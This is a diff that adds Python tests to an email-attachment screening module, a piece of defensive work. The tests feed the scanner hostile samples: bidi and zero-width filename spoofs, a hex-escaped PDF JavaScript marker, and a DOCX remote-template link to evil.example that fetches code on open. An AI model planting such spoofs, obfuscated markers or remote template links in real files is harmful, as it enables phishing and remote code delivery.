@@ -297,3 +297,69 @@ def test_po_attachment_hmac_cross_language_vector():
         filename="spec sheet.pdf", declared_mime="application/pdf",
         size_bytes=20, sha256="aa" * 32,
     )
+
+
+# ---- review-fix additions (items 4/5/6) ----------------------------------------------
+
+
+def test_filename_bidi_format_controls_are_suspicious():
+    """Review W8/attacker#4 — the Mac-side mirror of the Worker's filename gate:
+    RTLO / zero-width / bidi-isolate names are display spoofs and refuse at L1."""
+    for name in (
+        "spec‮gpj.pdf",   # RTLO
+        "zero​width.pdf",  # zero-width space
+        "iso⁦late.pdf",    # bidi isolate
+        "bom﻿.pdf",        # ZWNBSP/BOM
+        "path/sep.pdf",         # path separator (pre-existing class, same gate)
+        ".hidden.pdf",          # leading dot
+    ):
+        r = pas.screen_attachment(name, MIME_PDF, minimal_pdf())
+        assert (r.disposition, r.layer) == ("suspicious", "L1"), name
+        assert r.detail == "filename_format_controls", name
+
+
+def test_pdf_hex_name_escape_obfuscation_detected():
+    """Review truthful-posture (b): /#4A…-escaped markers normalize before the scan —
+    the cheapest obfuscation no longer slips through."""
+    escaped = minimal_pdf(b"<< /#4Aava#53cript (app.alert(1)) >>")
+    assert b"/JavaScript" not in escaped  # raw bytes do NOT contain the plain marker
+    r = pas.screen_attachment("spec.pdf", MIME_PDF, escaped)
+    assert (r.disposition, r.layer) == ("suspicious", "L2")
+    assert r.detail == "pdf_active_content:JavaScript"
+    assert pas.is_structural_active_content(r)
+
+
+def test_docx_external_attached_template_rels_is_suspicious():
+    """Review attacker#2: a TargetMode="External" relationship naming an
+    attachedTemplate (remote-template fetch on open — macro-less vector) refuses."""
+    rels = (
+        b'<?xml version="1.0"?><Relationships>'
+        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
+        b'officeDocument/2006/relationships/attachedTemplate" '
+        b'Target="http://evil.example/t.dotm" TargetMode="External"/>'
+        b"</Relationships>"
+    )
+    data = openxml_zip(pas.MIME_DOCX, {"word/_rels/settings.xml.rels": rels})
+    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
+    assert (r.disposition, r.detail) == ("suspicious", "openxml_external_relationship")
+    assert pas.is_structural_active_content(r)  # the caller security-flags it
+
+
+def test_docx_internal_rels_stay_clean():
+    """A normal internal relationship part (every real docx has them) must NOT trip
+    the external-relationship check — no TargetMode="External"."""
+    rels = (
+        b'<?xml version="1.0"?><Relationships>'
+        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/'
+        b'officeDocument/2006/relationships/styles" Target="styles.xml"/>'
+        b"</Relationships>"
+    )
+    data = openxml_zip(pas.MIME_DOCX, {"word/_rels/document.xml.rels": rels})
+    assert pas.screen_attachment("s.docx", pas.MIME_DOCX, data).disposition == "clean"
+
+
+def test_docx_embedded_ole_object_is_suspicious():
+    data = openxml_zip(pas.MIME_DOCX, {"word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0"})
+    r = pas.screen_attachment("s.docx", pas.MIME_DOCX, data)
+    assert (r.disposition, r.detail) == ("suspicious", "openxml_ole_object")
+    assert pas.is_structural_active_content(r)
